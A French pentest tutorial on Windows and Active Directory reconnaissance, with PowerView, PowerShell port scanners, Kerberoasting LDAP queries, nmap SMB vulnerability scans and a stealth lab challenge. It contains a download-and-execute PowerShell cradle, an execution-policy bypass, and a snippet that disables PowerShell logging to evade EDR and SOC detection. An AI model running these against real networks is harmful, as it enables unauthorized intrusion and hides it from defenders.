# Windows Recon-Scanning – Intermediate

La reconnaissance réseau intermédiaire sous Windows exploite des outils PowerShell avancés et des techniques d'énumération sophistiquées pour analyser les environnements Active Directory complexes. Ce guide couvre l'utilisation de PowerView pour l'énumération de domaine, les techniques Invoke-Portscan pour la découverte de services, et l'exploitation des scripts NSE spécialisés pour l'analyse approfondie des infrastructures Windows d'entreprise.

## Table of Contents
1. Concepts clés
2. Outils & Commandes
3. Méthode pas-à-pas
4. OPSEC Tips
5. Lab-Challenge
6. Going Further

---

### 1 • Concepts clés

#### 1.1 PowerShell et frameworks de reconnaissance avancés

PowerShell constitue l'environnement de choix pour la reconnaissance Windows avancée grâce à sa capacité d'interaction native avec les APIs Windows et Active Directory. Les frameworks comme PowerView, PowerSploit et Empire fournissent des modules spécialisés pour l'énumération de domaine, la découverte de services et l'analyse des relations de confiance.

L'avantage de PowerShell réside dans sa légitimité apparente : les scripts PowerShell sont couramment utilisés par les administrateurs système, rendant leur exécution moins suspecte que les outils tiers. Cette approche "living off the land" permet d'opérer dans des environnements sécurisés sans déclencher d'alertes de sécurité.

#### 1.2 Énumération Active Directory et analyse des relations

Les environnements Active Directory complexes présentent des structures hiérarchiques avec des relations de confiance inter-domaines, des délégations de privilèges et des configurations de sécurité sophistiquées. L'énumération intermédiaire nécessite la compréhension de ces relations pour identifier les chemins d'escalade de privilèges et les vulnérabilités de configuration.

L'analyse des objets Active Directory (utilisateurs, groupes, ordinateurs, GPO) révèle des informations critiques sur la posture de sécurité de l'organisation. Les techniques avancées incluent l'identification des comptes de service, l'analyse des délégations Kerberos et la découverte des chemins d'attaque vers les comptes privilégiés.

#### 1.3 Techniques de scan de ports Windows-spécifiques

Les environnements Windows nécessitent des approches de scan adaptées aux spécificités des services Microsoft. Les techniques incluent l'utilisation de WMI pour la découverte de services, l'exploitation des APIs Windows pour l'énumération de ports et l'utilisation de PowerShell pour les scans distribués.

L'approche Windows-native permet de contourner les restrictions de pare-feu et les systèmes de détection en utilisant des protocoles légitimes. Les techniques incluent l'utilisation de Test-NetConnection pour les tests de connectivité, Invoke-Command pour l'exécution distribuée et Get-WmiObject pour l'énumération de services distants.

#### 1.4 Analyse des vulnérabilités et configurations de sécurité

L'évaluation intermédiaire des environnements Windows inclut l'analyse des configurations de sécurité, l'identification des vulnérabilités de patch et l'évaluation des politiques de sécurité. Cette approche nécessite la corrélation d'informations provenant de multiples sources pour identifier les faiblesses exploitables.

Les techniques avancées incluent l'analyse des GPO pour identifier les configurations dangereuses, l'énumération des services avec des privilèges élevés et l'identification des systèmes avec des versions obsolètes. Cette analyse holistique permet de prioriser les cibles et d'optimiser les phases ultérieures du test de pénétration.


### 2 • Outils & Commandes

#### Tableau comparatif des outils Windows intermédiaires

| Outil | Spécialisation | Complexité | Détection | Efficacité |
|-------|----------------|------------|-----------|------------|
| PowerView | Énumération AD | Moyenne | Faible | Très élevée |
| PowerSploit | Framework complet | Élevée | Moyenne | Très élevée |
| BloodHound | Analyse de chemins | Moyenne | Moyenne | Très élevée |
| Invoke-Portscan | Scan PowerShell | Faible | Très faible | Élevée |
| WMI | Énumération native | Moyenne | Très faible | Élevée |
| LDAP queries | Requêtes AD directes | Élevée | Faible | Très élevée |

#### PowerView pour l'énumération Active Directory

```powershell
# Import du module PowerView
Import-Module .\PowerView.ps1
# Ou téléchargement direct
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```
PowerView fournit des fonctions avancées pour l'énumération Active Directory sans nécessiter de privilèges administrateur.

```powershell
# Énumération des domaines et contrôleurs
Get-Domain
Get-DomainController
Get-DomainTrust
```
Identifie la structure du domaine, les contrôleurs disponibles et les relations de confiance inter-domaines.

```powershell
# Découverte des utilisateurs et groupes privilégiés
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
Get-DomainGroupMember "Domain Admins"
```
Énumère les comptes avec des privilèges élevés et analyse l'appartenance aux groupes critiques.

```powershell
# Énumération des ordinateurs et services
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -Unconstrained
Find-DomainShare -CheckShareAccess
```
Découvre les serveurs, identifie les délégations non contraintes et localise les partages accessibles.

#### Techniques Invoke-Portscan et scan PowerShell

```powershell
# Fonction de scan de ports PowerShell native
function Invoke-PortScan {
    param([string]$ComputerName, [int[]]$Ports)
    foreach ($Port in $Ports) {
        try {
            $Socket = New-Object System.Net.Sockets.TcpClient
            $Socket.Connect($ComputerName, $Port)
            Write-Output "$ComputerName:$Port - OPEN"
            $Socket.Close()
        } catch {
            Write-Output "$ComputerName:$Port - CLOSED"
        }
    }
}
```
Scanner de ports PowerShell personnalisé utilisant les APIs .NET natives.

```powershell
# Scan distribué avec Invoke-Command
$Computers = Get-DomainComputer | Select-Object -ExpandProperty Name
$Ports = @(21,22,23,25,53,80,135,139,443,445,3389,5985,5986)

Invoke-Command -ComputerName $Computers -ScriptBlock {
    param($PortList)
    foreach ($Port in $PortList) {
        $Result = Test-NetConnection -ComputerName $env:COMPUTERNAME -Port $Port -WarningAction SilentlyContinue
        if ($Result.TcpTestSucceeded) {
            Write-Output "$env:COMPUTERNAME:$Port - OPEN"
        }
    }
} -ArgumentList (,$Ports)
```
Exécute des scans de ports distribués sur tous les ordinateurs du domaine.

```powershell
# Scan avec WMI pour contourner les restrictions
Get-WmiObject -Class Win32_Process -ComputerName $ComputerName | 
    Where-Object {$_.Name -like "*service*"} | 
    Select-Object Name, ProcessId, CommandLine
```
Utilise WMI pour énumérer les processus et identifier les services actifs à distance.

#### Scripts NSE spécialisés pour Windows

```cmd
REM Énumération SMB complète avec NSE
nmap --script smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups,smb-enum-services,smb-enum-sessions -p 445 TARGET
```
Exécute une batterie complète de scripts SMB pour l'énumération Windows.

```cmd
REM Détection de vulnérabilités SMB critiques
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 -p 445 TARGET
```
Scanne les vulnérabilités SMB les plus critiques incluant EternalBlue et autres exploits.

```cmd
REM Énumération RDP et Terminal Services
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 TARGET
```
Analyse les configurations RDP et détecte les vulnérabilités des services de bureau à distance.

```cmd
REM Énumération WinRM et PowerShell Remoting
nmap --script winrm-enum,http-enum -p 5985,5986 TARGET
```
Identifie les services WinRM et analyse leurs configurations de sécurité.

#### Techniques d'énumération LDAP avancées

```powershell
# Requêtes LDAP directes pour l'énumération
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")
$Searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*Server*))"
$Searcher.FindAll() | ForEach-Object { $_.Properties.name }
```
Effectue des requêtes LDAP directes pour énumérer les objets Active Directory.

```powershell
# Recherche d'attributs sensibles dans AD
$Searcher.Filter = "(&(objectCategory=user)(description=*password*))"
$Searcher.FindAll() | ForEach-Object { 
    Write-Output "User: $($_.Properties.samaccountname) - Description: $($_.Properties.description)"
}
```
Recherche les comptes utilisateur avec des mots de passe dans les descriptions.

```powershell
# Énumération des SPNs pour Kerberoasting
$Searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
$Searcher.FindAll() | ForEach-Object {
    Write-Output "SPN User: $($_.Properties.samaccountname) - SPN: $($_.Properties.serviceprincipalname)"
}
```
Identifie les comptes de service avec des SPNs pour les attaques Kerberoasting.

### 3 • Méthode pas-à-pas

#### Étape 1 : Configuration de l'environnement PowerShell avancé

Préparez un environnement PowerShell avec les modules nécessaires pour la reconnaissance Windows avancée.

```powershell
# Configuration de l'execution policy pour les scripts
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force

# Téléchargement et import de PowerView
$PowerViewUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
IEX (New-Object Net.WebClient).DownloadString($PowerViewUrl)

# Vérification des privilèges et du contexte
whoami /all
Get-DomainUser $env:USERNAME
```

#### Étape 2 : Énumération complète du domaine Active Directory

Effectuez une reconnaissance systématique de l'infrastructure Active Directory.

```powershell
# Découverte de la topologie du domaine
$Domain = Get-Domain
$DCs = Get-DomainController
$Trusts = Get-DomainTrust

Write-Output "Domaine: $($Domain.Name)"
Write-Output "Contrôleurs de domaine: $($DCs.Name -join ', ')"
Write-Output "Relations de confiance: $($Trusts.TargetName -join ', ')"

# Énumération des utilisateurs privilégiés
$AdminUsers = Get-DomainUser -AdminCount | Select-Object samaccountname, description
$DAMembers = Get-DomainGroupMember "Domain Admins" | Select-Object MemberName

# Identification des ordinateurs critiques
$Servers = Get-DomainComputer -OperatingSystem "*Server*" | Select-Object name, operatingsystem
$Unconstrained = Get-DomainComputer -Unconstrained | Select-Object name
```

#### Étape 3 : Scan de ports distribué avec PowerShell

Implémentez un scan de ports sophistiqué utilisant les capacités natives de PowerShell.

```powershell
# Fonction de scan optimisée
function Invoke-AdvancedPortScan {
    param(
        [string[]]$ComputerName,
        [int[]]$Ports = @(21,22,23,25,53,80,135,139,443,445,3389,5985,5986),
        [int]$Timeout = 1000,
        [int]$MaxThreads = 50
    )
    
    $Jobs = @()
    foreach ($Computer in $ComputerName) {
        $Jobs += Start-Job -ScriptBlock {
            param($Comp, $PortList, $TimeoutMs)
            $Results = @()
            foreach ($Port in $PortList) {
                try {
                    $Socket = New-Object System.Net.Sockets.TcpClient
                    $Connect = $Socket.BeginConnect($Comp, $Port, $null, $null)
                    $Wait = $Connect.AsyncWaitHandle.WaitOne($TimeoutMs, $false)
                    if ($Wait) {
                        $Socket.EndConnect($Connect)
                        $Results += "$Comp`:$Port - OPEN"
                    }
                    $Socket.Close()
                } catch {}
            }
            return $Results
        } -ArgumentList $Computer, $Ports, $Timeout
        
        # Limitation du nombre de jobs simultanés
        while ((Get-Job -State Running).Count -ge $MaxThreads) {
            Start-Sleep -Milliseconds 100
        }
    }
    
    # Collecte des résultats
    $Jobs | Wait-Job | Receive-Job
    $Jobs | Remove-Job
}

# Exécution du scan sur tous les ordinateurs du domaine
$AllComputers = Get-DomainComputer | Select-Object -ExpandProperty name
$ScanResults = Invoke-AdvancedPortScan -ComputerName $AllComputers
```

#### Étape 4 : Énumération des services et vulnérabilités

Approfondissez l'analyse des services découverts pour identifier les vulnérabilités.

```powershell
# Énumération des partages accessibles
$Shares = Find-DomainShare -CheckShareAccess
$InterestingShares = $Shares | Where-Object {$_.ShareName -notlike "*$" -and $_.ShareName -ne "SYSVOL" -and $_.ShareName -ne "NETLOGON"}

# Test d'accès aux partages administratifs
$AdminShares = @()
foreach ($Computer in $AllComputers) {
    try {
        $TestPath = "\\$Computer\C$"
        if (Test-Path $TestPath) {
            $AdminShares += $Computer
        }
    } catch {}
}

# Énumération des services WinRM
$WinRMHosts = @()
foreach ($Computer in $AllComputers) {
    if (Test-WSMan -ComputerName $Computer -ErrorAction SilentlyContinue) {
        $WinRMHosts += $Computer
    }
}
```

#### Étape 5 : Analyse des vulnérabilités avec Nmap

Utilisez Nmap pour une analyse détaillée des vulnérabilités Windows.

```cmd
REM Création de la liste des cibles depuis PowerShell
powershell -Command "Get-DomainComputer | Select-Object -ExpandProperty name | Out-File -FilePath targets.txt -Encoding ASCII"

REM Scan de vulnérabilités SMB sur toutes les cibles
nmap -iL targets.txt -p 445 --script smb-vuln-* --script-args=unsafe=1 -oA smb_vulns

REM Énumération complète des services Windows
nmap -iL targets.txt -p 135,139,445,3389,5985,5986 -sV --script smb-enum-*,rdp-enum-*,winrm-enum -oA windows_services

REM Détection des systèmes non patchés
nmap -iL targets.txt --script smb-os-discovery,smb-security-mode -p 445 -oA os_discovery
```

#### Étape 6 : Corrélation et analyse des résultats

Consolidez toutes les informations collectées pour identifier les cibles prioritaires.

```powershell
# Génération d'un rapport consolidé
$Report = @{
    Domain = $Domain.Name
    DomainControllers = $DCs.Name
    TotalComputers = $AllComputers.Count
    ServersFound = $Servers.Count
    AdminShareAccess = $AdminShares.Count
    WinRMEnabled = $WinRMHosts.Count
    InterestingShares = $InterestingShares.Count
    PrivilegedUsers = $AdminUsers.Count
}

$Report | ConvertTo-Json | Out-File -FilePath "reconnaissance_report.json"

# Identification des cibles prioritaires
$HighValueTargets = @()
$HighValueTargets += $DCs.Name  # Contrôleurs de domaine
$HighValueTargets += $AdminShares  # Systèmes avec partages admin accessibles
$HighValueTargets += $WinRMHosts  # Systèmes avec WinRM activé

Write-Output "Cibles prioritaires identifiées: $($HighValueTargets.Count)"
$HighValueTargets | Out-File -FilePath "priority_targets.txt"
```

### 4 • OPSEC Tips

#### 4.1 Utilisation furtive de PowerShell et contournement des détections

PowerShell génère des logs détaillés dans les Event Logs Windows (Event ID 4103, 4104) qui peuvent révéler vos activités. Utilisez des techniques d'obfuscation et de contournement pour minimiser les traces. Évitez les cmdlets PowerShell suspectes et privilégiez les APIs .NET directes quand possible.

```powershell
# Désactivation temporaire du logging PowerShell (nécessite des privilèges)
$GroupPolicySettings = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
$GroupPolicySettings.SetValue($null, @{})
```

Utilisez des techniques de "living off the land" en exploitant les outils légitimes présents sur les systèmes Windows. Cette approche réduit la probabilité de détection par les solutions EDR qui se concentrent sur les outils malveillants connus.

#### 4.2 Gestion des sessions et authentification distribuée

Les connexions WinRM et les sessions PowerShell distantes génèrent des événements d'authentification traçables. Utilisez des comptes de service ou des comptes génériques pour distribuer les connexions et éviter l'attribution à un utilisateur spécifique. Limitez la durée des sessions et fermez-les proprement.

```powershell
# Gestion propre des sessions distantes
$Sessions = New-PSSession -ComputerName $Targets -ErrorAction SilentlyContinue
try {
    $Results = Invoke-Command -Session $Sessions -ScriptBlock { Get-Process }
} finally {
    Remove-PSSession $Sessions
}
```

Alternez entre différentes méthodes d'authentification (NTLM, Kerberos) et utilisez des tickets Kerberos existants quand possible pour éviter la génération de nouveaux événements d'authentification.

#### 4.3 Limitation du bruit réseau et timing adaptatif

Les scans PowerShell peuvent générer un trafic réseau important facilement détectable par les systèmes de monitoring. Implémentez des délais adaptatifs et limitez le nombre de connexions simultanées pour simuler un comportement administratif normal.

```powershell
# Scan avec timing adaptatif
function Invoke-StealthScan {
    param([string[]]$Targets, [int]$DelayMin = 5, [int]$DelayMax = 30)
    
    foreach ($Target in $Targets) {
        # Scan du target
        Test-NetConnection -ComputerName $Target -Port 445 -WarningAction SilentlyContinue
        
        # Délai aléatoire entre les scans
        $Delay = Get-Random -Minimum $DelayMin -Maximum $DelayMax
        Start-Sleep -Seconds $Delay
    }
}
```

Surveillez vos propres activités dans les logs pour comprendre les signatures générées et adapter vos techniques en conséquence.

### 5 • Lab-Challenge

#### Scénario : Audit de sécurité d'une infrastructure Windows d'entreprise

Vous êtes pentester senior chargé d'évaluer la sécurité d'une infrastructure Windows d'entreprise de 500 employés répartis sur 3 sites. L'environnement comprend une forêt Active Directory multi-domaines (CORP.LOCAL, DEV.CORP.LOCAL, DMZ.CORP.LOCAL) avec des relations de confiance complexes, des serveurs d'applications critiques et une infrastructure de virtualisation.

Votre accès initial se fait via un compte utilisateur standard sur un poste Windows 10 du domaine CORP.LOCAL. L'entreprise dispose de solutions EDR avancées et d'équipes SOC actives. Votre mission consiste à démontrer les capacités de reconnaissance d'un attaquant interne tout en évitant la détection pendant 48 heures.

#### ⚑ Étape 1 : Énumération furtive multi-domaines

**Objectif :** Cartographier l'ensemble de la forêt Active Directory et identifier les relations de confiance sans déclencher d'alertes.

**Questions :**
1. Énumérez tous les domaines de la forêt et leurs relations de confiance en utilisant uniquement PowerView.
2. Identifiez tous les contrôleurs de domaine de chaque domaine avec leurs rôles FSMO.
3. Découvrez les comptes de service avec des SPNs dans tous les domaines accessibles.
4. Cartographiez les groupes privilégiés inter-domaines et leurs membres.

**Contraintes :**
- Utilisez uniquement des techniques PowerShell natives et PowerView
- Implémentez des délais de 10+ secondes entre chaque requête LDAP
- Aucune connexion directe aux contrôleurs de domaine autres que celui par défaut
- Documentez toutes les relations de confiance découvertes

#### ⚑ Étape 2 : Reconnaissance distribuée et énumération de services

**Objectif :** Effectuer un scan de ports distribué sur l'ensemble de l'infrastructure en utilisant les capacités PowerShell.

**Questions :**
1. Développez un scanner PowerShell distribué capable de traiter 500+ cibles avec gestion d'erreurs.
2. Identifiez tous les serveurs avec WinRM activé et testez l'accès avec vos credentials actuels.
3. Énumérez tous les partages SMB accessibles et classifiez-les par niveau de sensibilité.
4. Découvrez les services non-standard sur des ports élevés (>10000) en utilisant Test-NetConnection.

**Contraintes :**
- Maximum 5 connexions simultanées pour éviter la détection
- Utilisez Invoke-Command pour distribuer les tâches de scan
- Implémentez une rotation automatique des sources de scan
- Sauvegardez tous les résultats en format JSON structuré

#### ⚑ Étape 3 : Analyse de vulnérabilités et chemins d'attaque

**Objectif :** Identifier les vulnérabilités critiques et analyser les chemins d'escalade de privilèges.

**Questions :**
1. Utilisez les scripts NSE pour détecter toutes les vulnérabilités SMB sur l'infrastructure.
2. Identifiez les systèmes avec des délégations Kerberos non contraintes.
3. Analysez les GPO pour identifier les configurations de sécurité dangereuses.
4. **Bonus expert :** Créez un graphique des chemins d'attaque vers les Domain Admins en utilisant les données collectées.

**Livrables attendus :**
- Cartographie complète de la forêt Active Directory avec toutes les relations
- Base de données des services découverts avec évaluation de risque
- Rapport de vulnérabilités avec preuves de concept
- Scripts PowerShell documentés pour reproduire l'audit
- Analyse des chemins d'escalade de privilèges avec recommandations

### 6 • Going Further

#### Ressources officielles et frameworks avancés

**PowerSploit Framework** - https://github.com/PowerShellMafia/PowerSploit
Framework PowerShell complet pour les tests de pénétration Windows avec modules spécialisés pour la reconnaissance et l'exploitation.

**BloodHound Community Edition** - https://github.com/BloodHoundAD/BloodHound
Outil d'analyse des chemins d'attaque Active Directory avec interface graphique pour visualiser les relations complexes.

**Microsoft Advanced Threat Analytics** - https://docs.microsoft.com/en-us/advanced-threat-analytics/
Documentation officielle Microsoft sur la détection des techniques d'attaque avancées contre Active Directory.

#### Ressources d'apprentissage spécialisées

**"PowerShell for Penetration Testers" par David Kennedy**
Guide pratique couvrant l'utilisation de PowerShell pour les tests de pénétration avec focus sur les techniques d'évasion.

**"Active Directory Security" par Sean Metcalf**
Référence experte sur la sécurité Active Directory incluant les techniques d'énumération avancées et les contre-mesures.

**Chaîne YouTube "SpecterOps"** - https://www.youtube.com/c/SpecterOps
Présentations techniques sur les techniques d'attaque Active Directory et les méthodologies de reconnaissance avancées.

**Cours "Advanced Windows Attacks" sur Pentester Academy**
Formation spécialisée sur les techniques d'attaque Windows avancées incluant l'énumération PowerShell et l'exploitation AD.

#### Certifications et spécialisations avancées

**CRTP (Certified Red Team Professional)**
Certification spécialisée dans les attaques Active Directory avec emphasis sur les techniques PowerShell et l'énumération de domaine.

**GPEN (GIAC Penetration Tester)**
Certification SANS incluant des modules avancés sur les tests de pénétration Windows et l'énumération Active Directory.

**OSEP (Offensive Security Experienced Penetration Tester)**
Certification avancée d'Offensive Security couvrant les techniques d'évasion et les attaques sophistiquées contre les environnements Windows.

